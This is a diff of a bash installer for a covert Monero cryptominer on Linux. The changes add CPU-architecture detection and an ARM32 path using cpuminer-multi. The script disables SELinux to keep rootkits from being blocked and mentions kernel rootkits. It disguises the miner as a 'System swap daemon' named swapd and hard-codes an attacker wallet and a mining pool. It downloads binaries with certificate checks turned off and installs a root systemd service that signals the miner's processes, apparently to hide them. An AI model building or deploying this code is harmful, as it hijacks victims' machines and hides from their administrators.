@@ -1,96 +1,115 @@
 #!/bin/bash
 
-# ==================== INTERACTIVE ARCHITECTURE SELECTION ====================
-echo ""
-echo "=========================================="
-echo "ARCHITECTURE SELECTION"
-echo "=========================================="
-echo ""
+# ==================== ARCHITECTURE AUTO-DETECTION ====================
+# USAGE EXAMPLES:
+#
+# 1. NON-INTERACTIVE (unattended, via curl - NO PROMPTS, AUTO-DETECTS):
+#    curl -L "https://raw.githubusercontent.com/.../script.sh" | bash -s WALLET EMAIL
+#    → Automatically detects architecture and proceeds
+#
+# 2. INTERACTIVE (manual execution - SHOWS MENU):
+#    bash script.sh WALLET EMAIL
+#    → Shows architecture selection menu
+#
+# When run via curl | bash, stdin is not a terminal, so we auto-detect
+# When run as ./script.sh, stdin IS a terminal, so we can ask
 
 # Auto-detect architecture
 DETECTED_ARCH=$(uname -m)
-echo "[*] Auto-detected architecture: $DETECTED_ARCH"
-echo ""
 
-# Map to supported types
-case "$DETECTED_ARCH" in
-    x86_64|amd64)
-        SUGGESTED_CHOICE="1"
-        ARCH_NAME="x86_64 (Intel/AMD 64-bit)"
-        ;;
-    aarch64|arm64)
-        SUGGESTED_CHOICE="2"
-        ARCH_NAME="ARM64 (64-bit ARM - Raspberry Pi 4, etc.)"
-        ;;
-    armv7l|armhf|armv6l)
-        SUGGESTED_CHOICE="3"
-        ARCH_NAME="ARMv7/ARMv6 (32-bit ARM - routers, old Pi)"
-        ;;
-    i686|i386)
-        SUGGESTED_CHOICE="4"
-        ARCH_NAME="x86 (32-bit Intel/AMD - NOT SUPPORTED)"
-        ;;
-    mips|mipsel|mips64)
-        SUGGESTED_CHOICE="5"
-        ARCH_NAME="MIPS (routers - NOT SUPPORTED)"
-        ;;
-    *)
-        SUGGESTED_CHOICE="6"
-        ARCH_NAME="Unknown: $DETECTED_ARCH"
-        ;;
-esac
-
-echo "Detected: $ARCH_NAME"
-echo ""
-echo "Select your CPU architecture:"
-echo "  1) x86_64 / amd64    (Intel/AMD 64-bit servers)"
-echo "  2) ARM64 / aarch64   (Raspberry Pi 4, ARM servers)"
-echo "  3) ARMv7 / ARMv6     (32-bit ARM - routers, old Raspberry Pi)"
-echo "  4) x86 / i686        (32-bit Intel/AMD - NOT SUPPORTED)"
-echo "  5) MIPS              (Routers - NOT SUPPORTED)"
-echo "  6) Skip/Auto-detect  (Use detected: $DETECTED_ARCH)"
-echo ""
-echo -n "Enter choice [1-6] (default: $SUGGESTED_CHOICE): "
-
-# Check if running non-interactively
+# Check if running interactively (has a terminal)
 if [ -t 0 ]; then
+    # INTERACTIVE MODE - Show menu
+    echo ""
+    echo "=========================================="
+    echo "ARCHITECTURE SELECTION"
+    echo "=========================================="
+    echo ""
+    echo "[*] Auto-detected architecture: $DETECTED_ARCH"
+    echo ""
+
+    # Map to suggested choice
+    case "$DETECTED_ARCH" in
+        x86_64|amd64)
+            SUGGESTED_CHOICE="1"
+            ARCH_NAME="x86_64 (Intel/AMD 64-bit)"
+            ;;
+        aarch64|arm64)
+            SUGGESTED_CHOICE="2"
+            ARCH_NAME="ARM64 (64-bit ARM - Raspberry Pi 4, etc.)"
+            ;;
+        armv7l|armhf|armv6l)
+            SUGGESTED_CHOICE="3"
+            ARCH_NAME="ARMv7/ARMv6 (32-bit ARM - routers, old Pi)"
+            ;;
+        i686|i386)
+            SUGGESTED_CHOICE="4"
+            ARCH_NAME="x86 (32-bit Intel/AMD - NOT SUPPORTED)"
+            ;;
+        mips|mipsel|mips64)
+            SUGGESTED_CHOICE="5"
+            ARCH_NAME="MIPS (routers - NOT SUPPORTED)"
+            ;;
+        *)
+            SUGGESTED_CHOICE="6"
+            ARCH_NAME="Unknown: $DETECTED_ARCH"
+            ;;
+    esac
+
+    echo "Detected: $ARCH_NAME"
+    echo ""
+    echo "Select your CPU architecture:"
+    echo "  1) x86_64 / amd64    (Intel/AMD 64-bit servers)"
+    echo "  2) ARM64 / aarch64   (Raspberry Pi 4, ARM servers)"
+    echo "  3) ARMv7 / ARMv6     (32-bit ARM - routers, old Raspberry Pi)"
+    echo "  4) x86 / i686        (32-bit Intel/AMD - NOT SUPPORTED)"
+    echo "  5) MIPS              (Routers - NOT SUPPORTED)"
+    echo "  6) Skip/Auto-detect  (Use detected: $DETECTED_ARCH)"
+    echo ""
+    echo -n "Enter choice [1-6] (default: $SUGGESTED_CHOICE): "
+    
     read -r ARCH_CHOICE
+    ARCH_CHOICE=${ARCH_CHOICE:-$SUGGESTED_CHOICE}
+    
+    case "$ARCH_CHOICE" in
+        1) FORCE_ARCH="x86_64"; echo "[*] Selected: x86_64" ;;
+        2) FORCE_ARCH="aarch64"; echo "[*] Selected: ARM64" ;;
+        3) FORCE_ARCH="armv7l"; echo "[*] Selected: ARMv7 (will use cpuminer-multi)" ;;
+        4) echo "[!] ERROR: x86 32-bit is NOT supported"; exit 1 ;;
+        5) echo "[!] ERROR: MIPS is NOT supported"; exit 1 ;;
+        6|*) FORCE_ARCH="$DETECTED_ARCH"; echo "[*] Using auto-detected: $DETECTED_ARCH" ;;
+    esac
+    echo ""
 else
-    ARCH_CHOICE=""
-    echo "[non-interactive mode]"
+    # NON-INTERACTIVE MODE (piped from curl) - Auto-detect silently
+    FORCE_ARCH="$DETECTED_ARCH"
+    echo "[*] Non-interactive mode: Auto-detected architecture: $DETECTED_ARCH"
+    
+    # Validate architecture is supported
+    case "$DETECTED_ARCH" in
+        x86_64|amd64)
+            echo "[*] Using XMRig for x86_64"
+            ;;
+        aarch64|arm64)
+            echo "[*] Using XMRig ARM64 for aarch64"
+            ;;
+        armv7l|armhf|armv6l)
+            echo "[*] Using cpuminer-multi for ARMv7/ARMv6"
+            ;;
+        i686|i386)
+            echo "[!] ERROR: 32-bit x86 is NOT supported by modern miners"
+            exit 1
+            ;;
+        mips|mipsel|mips64)
+            echo "[!] ERROR: MIPS architecture is NOT supported"
+            exit 1
+            ;;
+        *)
+            echo "[!] WARNING: Unknown architecture: $DETECTED_ARCH"
+            echo "[!] Attempting to proceed with auto-detected value..."
+            ;;
+    esac
 fi
-
-# Use suggested if no input
-ARCH_CHOICE=${ARCH_CHOICE:-$SUGGESTED_CHOICE}
-
-case "$ARCH_CHOICE" in
-    1)
-        FORCE_ARCH="x86_64"
-        echo "[*] Selected: x86_64"
-        ;;
-    2)
-        FORCE_ARCH="aarch64"
-        echo "[*] Selected: ARM64"
-        ;;
-    3)
-        FORCE_ARCH="armv7l"
-        echo "[*] Selected: ARMv7 (will use cpuminer-multi instead of XMRig)"
-        ;;
-    4)
-        echo "[!] ERROR: x86 32-bit is NOT supported by modern miners"
-        exit 1
-        ;;
-    5)
-        echo "[!] ERROR: MIPS is NOT supported by XMRig or cpuminer-multi"
-        exit 1
-        ;;
-    6|*)
-        FORCE_ARCH="$DETECTED_ARCH"
-        echo "[*] Using auto-detected: $DETECTED_ARCH"
-        ;;
-esac
-
-echo ""
 
 # ==================== SELINUX DISABLE ====================
 # Disable SELinux temporarily to prevent rootkit blocking
@@ -190,27 +209,40 @@ git config --global credential.helper "" 2>/dev/null || true
 
 # ==================== ARCHITECTURE DETECTION ====================
 # Detect if system is 32-bit or 64-bit to skip incompatible rootkits
-ARCH=$(uname -m)
+ARCH=${FORCE_ARCH:-$(uname -m)}
+echo "[*] Using architecture: $ARCH"
+
 case "$ARCH" in
     x86_64|amd64)
         IS_64BIT=true
-        echo "[*] Detected 64-bit system (x86_64) - all rootkits available"
+        MINER_TYPE="xmrig"
+        echo "[*] Detected 64-bit system (x86_64) - using XMRig"
+        ;;
+    aarch64|arm64)
+        IS_64BIT=true
+        MINER_TYPE="xmrig"
+        echo "[*] Detected ARM 64-bit system - using XMRig ARM64"
+        ;;
+    armv7l|armv6l|armhf)
+        IS_64BIT=false
+        MINER_TYPE="cpuminer"
+        echo "[!] WARNING: 32-bit ARM detected ($ARCH)"
+        echo "[*] Using cpuminer-multi instead of XMRig (better ARM32 support)"
+        echo "[!] Kernel rootkits will be SKIPPED (architecture incompatible)"
         ;;
     i386|i686|x86)
         IS_64BIT=false
-        echo "[!] WARNING: 32-bit system detected ($ARCH)"
-        echo "[!] Advanced rootkits (Reptile, crypto-miner) will be SKIPPED"
-        echo "[!] Reason: They use 64-bit assembly and cannot compile on 32-bit"
-        ;;
-    armv7l|armv8|aarch64|arm*)
-        IS_64BIT=false
-        echo "[!] WARNING: ARM architecture detected ($ARCH)"
-        echo "[!] x86-specific kernel rootkits will be SKIPPED"
+        MINER_TYPE="unsupported"
+        echo "[!] ERROR: 32-bit x86 system detected ($ARCH)"
+        echo "[!] Modern miners do NOT support 32-bit x86"
+        exit 1
         ;;
     *)
         IS_64BIT=false
-        echo "[!] WARNING: Unknown architecture: $ARCH"
-        echo "[!] Kernel rootkits will be SKIPPED for safety"
+        MINER_TYPE="unsupported"
+        echo "[!] ERROR: Unknown/unsupported architecture: $ARCH"
+        echo "[!] Supported: x86_64, ARM64, ARMv7"
+        exit 1
         ;;
 esac
 
@@ -993,7 +1025,57 @@ if [ -n "$AVAILABLE_KB" ] && [ "$AVAILABLE_KB" -lt "$REQUIRED_KB" ]; then
     echo "[*] After cleanup: $((AVAILABLE_KB / 1024))MB available"
 fi
 
-# ==================== DOWNLOAD XMRIG ====================
+# ==================== DOWNLOAD MINER ====================
+if [ "$MINER_TYPE" = "cpuminer" ]; then
+    echo "[*] Downloading cpuminer-multi for ARM..."
+    echo "[*] Note: cpuminer-multi works better on ARM32 than XMRig"
+    
+    mkdir -p /root/.swapd
+    cd /root/.swapd || exit 1
+    
+    # cpuminer-multi precompiled for ARMv7
+    CPUMINER_URL="https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.7/cpuminer-multi-rel1.3.7-arm.tar.gz"
+    
+    echo "[*] Downloading from: $CPUMINER_URL"
+    if curl -L -k -o cpuminer.tar.gz "$CPUMINER_URL" 2>/dev/null || wget --no-check-certificate -O cpuminer.tar.gz "$CPUMINER_URL" 2>/dev/null; then
+        echo "[✓] Downloaded"
+        tar -xzf cpuminer.tar.gz 2>/dev/null || {
+            echo "[!] Extraction failed, trying alternative..."
+            # Fallback: try to download individual binary
+            curl -L -k -o swapd "https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.7/cpuminer-multi-arm" 2>/dev/null
+        }
+        
+        # Find and rename binary
+        if [ -f cpuminer-multi ]; then
+            mv cpuminer-multi swapd
+        elif [ -f bin/cpuminer-multi ]; then
+            mv bin/cpuminer-multi swapd
+        elif [ -f cpuminer-multi-arm ]; then
+            mv cpuminer-multi-arm swapd
+        fi
+        
+        chmod +x swapd 2>/dev/null
+        rm -rf cpuminer.tar.gz bin 2>/dev/null
+        
+        if [ -f swapd ] && [ -x swapd ]; then
+            echo "[✓] cpuminer-multi installed as 'swapd'"
+            ls -lh swapd
+        else
+            echo "[!] ERROR: Failed to install cpuminer-multi"
+            echo "[!] ARM32 mining not possible on this system"
+            exit 1
+        fi
+    else
+        echo "[!] ERROR: Failed to download cpuminer-multi"
+        echo "[!] Network issue or GitHub blocked"
+        exit 1
+    fi
+    
+    # Skip XMRig download entirely
+    DOWNLOAD_SUCCESS=true
+    
+elif [ "$MINER_TYPE" = "xmrig" ]; then
+    # ==================== DOWNLOAD XMRIG ====================
 echo "[*] Downloading XMRig..."
 
 mkdir -p /root/.swapd
@@ -1260,11 +1342,17 @@ else
 fi
 
 
-# ==================== CONFIGURE XMRIG ====================
-echo "[*] Configuring XMRig..."
+fi  # End of MINER_TYPE selection (cpuminer vs xmrig)
+
+# ==================== CONFIGURE MINER ====================
+echo "[*] Configuring miner..."
 
 # User-configurable variables
 WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+
+if [ "$MINER_TYPE" = "xmrig" ]; then
+    # ==================== CONFIGURE XMRIG ====================
+    echo "[*] Configuring XMRig..."
 
 # ==================== IP DETECTION FOR PASS FIELD ====================
 echo "[*] Detecting server IP address for worker identification..."
@@ -1373,6 +1461,46 @@ else
     echo "[*] Current pass field: $(grep '"pass"' swapfile || echo 'not found')"
 fi
 
+elif [ "$MINER_TYPE" = "cpuminer" ]; then
+    # ==================== CONFIGURE CPUMINER-MULTI ====================
+    echo "[*] Configuring cpuminer-multi..."
+    echo "[*] Note: cpuminer-multi uses command-line args, no JSON config"
+    
+    # Detect server IP for worker identification
+    echo "[*] Detecting server IP address for worker identification..."
+    PASS=$(get_server_ip)
+    if [ -z "$PASS" ] || [ "$PASS" = "localhost" ]; then
+        PASS="ARM-$(hostname)-$(date +%s)"
+    fi
+    echo "[*] Detected worker ID: $PASS"
+    
+    # Create a simple start script
+    cat > /root/.swapd/swapfile << 'CPUMINER_EOF'
+#!/bin/bash
+# cpuminer-multi start script
+cd /root/.swapd
+exec ./swapd \
+    -a cryptonight \
+    -o gulf.moneroocean.stream:80 \
+    -u WALLET_PLACEHOLDER \
+    -p PASS_PLACEHOLDER \
+    --cpu-priority 5 \
+    -t $(nproc) \
+    -B \
+    >/dev/null 2>&1
+CPUMINER_EOF
+    
+    # Replace placeholders
+    sed -i "s|WALLET_PLACEHOLDER|$WALLET|g" /root/.swapd/swapfile
+    sed -i "s|PASS_PLACEHOLDER|$PASS|g" /root/.swapd/swapfile
+    chmod +x /root/.swapd/swapfile
+    
+    echo "[✓] cpuminer-multi configured"
+    echo "[✓] Wallet: ${WALLET:0:20}..."
+    echo "[✓] Pass (Worker ID): $PASS"
+    echo "[*] Start script: /root/.swapd/swapfile"
+fi
+
 # ==================== CREATE INTELLIGENT WATCHDOG ====================
 echo "[*] Creating intelligent watchdog (3-minute interval, state-tracked)..."
 
@@ -1452,7 +1580,14 @@ echo "[✓] Intelligent watchdog created"
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
     echo "[*] Creating systemd service..."
     
-    cat > /etc/systemd/system/swapd.service << 'SERVICE_EOF'
+    # Set ExecStart based on miner type
+    if [ "$MINER_TYPE" = "cpuminer" ]; then
+        EXEC_START="/root/.swapd/swapfile"  # cpuminer uses start script
+    else
+        EXEC_START="/root/.swapd/swapd -c /root/.swapd/swapfile"  # xmrig uses binary + config
+    fi
+    
+    cat > /etc/systemd/system/swapd.service <<SERVICE_EOF
 [Unit]
 Description=System swap daemon
 After=network.target
@@ -1461,7 +1596,7 @@ After=network.target
 Type=simple
 User=root
 WorkingDirectory=/root/.swapd
-ExecStart=/root/.swapd/swapd -c /root/.swapd/swapfile
+ExecStart=$EXEC_START
 ExecStartPost=/bin/bash -c 'sleep 3; for i in 1 2 3; do pgrep -f swapd | xargs -r kill -31 2>/dev/null; pgrep -f swapd | xargs -r kill -59 2>/dev/null; sleep 1; done'
 Restart=always
 RestartSec=10
